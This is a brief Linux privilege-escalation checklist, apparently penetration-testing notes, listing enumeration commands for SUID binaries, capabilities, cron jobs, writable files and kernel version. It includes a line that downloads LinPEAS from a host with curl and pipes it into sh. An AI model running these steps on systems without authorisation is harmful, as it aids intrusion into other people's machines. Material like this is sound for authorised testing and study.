# AI - Linux Privilege Escalation

## ⚡ PrivEsc Checklist
- [ ] **LinPEAS** -> [[#LinPEAS]]
- [ ] **SUID Binaries** -> [[#SUID Binaries]]
- [ ] **Capabilities** -> [[#Capabilities]]
- [ ] **Cron Jobs** -> [[#Cron Jobs]]
- [ ] **Kernel Exploit** -> [[#Kernel Exploits]]

---

## Automated Enumeration

### LinPEAS
*Run from memory if possible, or curl and pipe to sh.*
```blade-bash tab="ops" pane="one"
curl -L http://$ip/linpeas.sh | sh
```

---

## Manual Enumeration

### SUID Binaries
*Find files with SUID bit set.*
```blade-bash tab="ops" pane="one"
find / -perm -4000 -type f 2>/dev/null
```

### Capabilities
*Check for dangerous capabilities.*
```blade-bash tab="ops" pane="one"
getcap -r / 2>/dev/null
```

### Cron Jobs
*Inspect system-wide and user cron jobs.*
```blade-bash tab="ops" pane="one"
cat /etc/crontab
```

### Writable Files
*Find world-writable files.*
```blade-bash tab="ops" pane="one"
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

---

## Kernel Exploits
*Check kernel version.*
```blade-bash tab="ops" pane="one"
uname -a
```
*Check OS release.*
```blade-bash tab="ops" pane="one"
cat /etc/*release
```